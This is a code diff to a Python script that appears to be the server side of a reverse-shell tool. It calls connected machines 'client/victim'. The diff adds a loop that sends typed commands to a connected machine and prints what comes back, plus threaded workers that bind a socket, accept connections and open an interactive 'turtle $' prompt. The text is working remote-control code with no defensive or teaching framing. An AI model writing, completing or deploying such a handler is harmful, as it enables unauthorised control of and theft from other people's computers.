@@ -78,7 +78,6 @@ def start_turtle():
 
     while True:
         cmd = input("turtle $ ")
-        
         if cmd == "list":
             list_connections()
         
@@ -126,11 +125,52 @@ def get_target(cmd):
 
 # Send commands to client/victim or a friend
 def send_target_commands(conn):
-    pass
     
-    
-    
-    
+    while True:
+        try:
+            cmd = input()
+            if cmd == 'quit':
+                break
+
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480),'utf-8')
+                print(client_response, end="")
+
+        except:
+            print("Error sending commands")
+            break
+
+# Create worker Threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+# do next job that is in queue (handel connections, send commands)
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            create_socket()
+            bind_socket()
+            accepting_connections()
+
+        if x == 2:
+            start_turtle()
+        
+        queue.task_done()
+
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+
+    queue.join()
+
+
+create_workers()
+create_jobs()   
     
     
     
